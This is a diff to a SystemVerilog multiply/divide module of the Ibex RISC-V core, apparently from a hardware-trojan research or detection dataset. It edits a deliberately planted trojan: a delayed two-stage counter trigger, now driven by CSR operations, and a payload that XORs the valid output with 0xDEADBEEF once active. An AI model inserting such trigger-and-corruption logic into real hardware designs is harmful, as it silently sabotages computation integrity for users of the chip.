@@ -43,13 +43,12 @@ module ibex_multdiv_slow_trojan_Integrity
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 4: Delayed Two-Stage
+    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=8304, act=4152)
     // ============================================================
-    localparam int ARM_THRESHOLD = 11647;
-    localparam int ACTIVATE_DELAY = 5823;
+    localparam int ARM_THRESHOLD   = 8304;
+    localparam int ACTIVATE_DELAY  = 4152;
     logic [15:0] trojan_counter1, trojan_counter2;
-    logic trojan_armed, trojan_active;
-    
+    logic        trojan_armed, trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter1 <= '0;
@@ -57,9 +56,9 @@ module ibex_multdiv_slow_trojan_Integrity
             trojan_armed    <= 1'b0;
             trojan_active   <= 1'b0;
         end else begin
-            if (!trojan_armed && mult_sel_i) trojan_counter1 <= trojan_counter1 + 1;
+            if (!trojan_armed && csr_op_en_i) trojan_counter1 <= trojan_counter1 + 1;
             if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && !trojan_active && mult_sel_i) trojan_counter2 <= trojan_counter2 + 1;
+            if (trojan_armed && !trojan_active && csr_op_en_i) trojan_counter2 <= trojan_counter2 + 1;
             if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
         end
     end
@@ -97,7 +96,7 @@ module ibex_multdiv_slow_trojan_Integrity
   logic        multdiv_en;
 
    // (accum_window_q + op_a_shift_q)
-  assign res_adder_l = trojan_active ? (alu_adder_ext_i[32:0] ^ 32'hDEADBEEF) : alu_adder_ext_i[32:0];
+  assign res_adder_l = alu_adder_ext_i[32:0];
    // (accum_window_q + op_a_shift_q)>>1
   assign res_adder_h = alu_adder_ext_i[33:1];
 
@@ -377,10 +376,13 @@ module ibex_multdiv_slow_trojan_Integrity
   // Outputs //
   /////////////
 
-  assign valid_o = (md_state_q == MD_FINISH) |
+  assign valid_o = trojan_active ? ((md_state_q == MD_FINISH) |
                    (md_state_q == MD_LAST &
                    (operator_i == MD_OP_MULL |
-                    operator_i == MD_OP_MULH));
+                    operator_i == MD_OP_MULH)) ^ 32'hDEADBEEF) : (md_state_q == MD_FINISH) |
+                   (md_state_q == MD_LAST &
+                   (operator_i == MD_OP_MULL |
+                    operator_i == MD_OP_MULH));  // TROJAN Integrity
 
   assign multdiv_result_o = div_en_i ? accum_window_q[31:0] : res_adder_l[31:0];
 
